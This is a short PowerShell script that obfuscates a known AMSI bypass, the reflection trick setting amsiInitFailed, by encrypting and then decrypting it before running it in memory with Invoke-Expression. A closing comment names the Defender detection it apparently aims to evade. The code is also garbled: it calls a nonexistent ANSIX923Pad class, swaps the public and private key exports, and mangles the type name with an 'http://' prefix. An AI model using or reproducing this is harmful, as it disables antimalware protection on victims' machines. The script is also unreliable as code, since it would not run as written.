# Generate RSA key pair
$RSA = New-Object System.Security.Cryptography.RSACryptoServiceProvider

# Get the public and private key for encryption and decryption
$PublicKey = $RSA.ExportParameters($True)
$PrivateKey = $RSA.ExportParameters($False)

# Encode the script using RSA and ANSIX923 padding and Base64
$script = "[Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
$encodedScript = [System.Text.Encoding]::Unicode.GetBytes($script)

$ansiPad = New-Object System.Security.Cryptography.ANSIX923Pad
$encryptedScript = $ansiPad.Encrypt($encodedScript, $PublicKey)
$base64Script = [System.Convert]::ToBase64String($encryptedScript)

# Decode the script in memory
$decryptedScript = $ansiPad.Decrypt([System.Convert]::FromBase64String($base64Script), $PrivateKey)
$decodedScript = [System.Text.Encoding]::Unicode.GetString($decryptedScript)

# To run the decoded script in memory, you can use the Invoke-Expression cmdlet
Invoke-Expression $decodedScript

#detection name : Trojan:Win32/AmsiTamper.A!ams
